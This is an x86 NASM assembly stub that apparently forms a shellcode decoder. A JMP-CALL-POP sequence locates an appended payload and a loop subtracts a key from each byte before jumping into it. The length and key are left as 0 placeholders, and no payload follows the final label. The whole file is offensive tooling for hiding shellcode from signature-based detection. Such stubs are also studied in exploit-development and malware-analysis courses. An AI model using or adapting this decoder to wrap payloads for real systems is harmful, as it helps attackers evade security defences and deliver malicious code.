BITS 32
section .text

	jmp short shell_adr
back:
	pop esi
	xor ecx, ecx
	mov cl, 0
.decrypt:
	sub byte [esi+ecx-1], 0
	dec cl
	jnz .decrypt
	jmp short shellcode
shell_adr:
	call back
shellcode: